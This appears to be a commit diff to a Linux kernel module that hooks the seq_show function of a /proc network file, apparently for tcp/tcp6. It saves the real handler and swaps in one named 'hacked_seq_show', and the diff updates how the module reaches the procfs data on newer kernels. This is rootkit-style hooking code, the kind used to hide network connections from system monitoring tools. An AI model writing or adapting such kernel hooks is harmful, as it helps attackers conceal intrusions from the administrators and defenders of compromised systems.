@@ -36,7 +36,7 @@ int hacked_seq_show(struct seq_file *seq, void *v){
 
 static int lkm_init(void){
 	struct file *filp;
-	AFINFO *afinfo;     //use this for tcp/tcp6
+	AFINFO *afinfo;
 
 	filp = filp_open(proc_file,O_RDONLY, 0);
 	if(IS_ERR(filp)){
@@ -44,7 +44,8 @@ static int lkm_init(void){
 	}
 	else{
 		printk("vfs hook succ\n");
-		afinfo = PDE_DATA(filp->f_path.dentry->d_inode);
+		//afinfo = PDE_DATA(filp->f_path.dentry->d_inode);
+		afinfo = PDE_DATA(filp->f_inode);
 		real_seq_show = afinfo->seq_ops.show;
 		p_seq_show=&afinfo->seq_ops.show;
 		afinfo->seq_ops.show = hacked_seq_show;
